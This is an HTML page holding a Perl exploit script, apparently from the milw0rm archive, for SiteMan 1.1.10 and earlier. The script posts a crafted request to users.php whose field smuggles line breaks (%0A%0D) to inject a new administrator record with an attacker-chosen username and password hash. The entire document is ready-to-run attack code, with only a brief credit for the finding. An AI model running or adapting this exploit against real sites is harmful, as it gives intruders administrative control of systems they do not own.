<html><head><title>Siteman <= 1.1.10 Remote Administrative Account Addition Exploit</title></head><pre>#!/usr/bin/perl -w
#
# Exploit by Noam Rathaus - Beyond Security Ltd.
# Exploit for the SiteMan vulnerability discovered by: &quot;amironline452&quot; &lt;amironline452@alphahackers.com&gt;
#

use Digest::MD5 qw(md5 md5_hex md5_base64);
use IO::Socket;
use strict;


# ./siteman.pl / vulnerable.host
my $Path = shift;
my $Host = shift;
my $Username = shift;
my $Password = md5_hex(shift);

print &quot;Path: $Path\nHost: $Host\nUsername: $Username\nPassword: $Password\n&quot;;

my $content = &quot;do=docreate&amp;line=%0A%0D$Username|$Password|5|$Username\@hacked.com|&quot;. &quot;$Username|1105956827|$Username|$Password|0|0|0|hackers%0A%0D&quot;;

my $request = &quot;POST $Path/users.php HTTP/1.1\r
Host: $Host\r
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040928 Firefox/0.9.3\r
Accept: text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5\r
Accept-Language: en-us,en;q=0.5\r
Accept-Encoding: gzip,deflate\r
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r
Content-Length: &quot;.length($content).&quot;\r
Content-Type: application/x-www-form-urlencoded\r
Connection: close\r
\r
$content&quot;;

my $remote = IO::Socket::INET-&gt;new ( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $Host, PeerPort =&gt; &quot;8080&quot;);

unless ($remote) { die &quot;cannot connect to http daemon on $Host&quot; }

print &quot;connected\n&quot;;

print &quot;request: [$request]\n&quot;;
print $remote $request. &quot;\r\n&quot;;

while (&lt;$remote&gt;)
{
 print $_;
}

close ($remote);

print &quot;\n\n--- done ---\n&quot;;

# milw0rm.com [2005-01-25]</pre></html>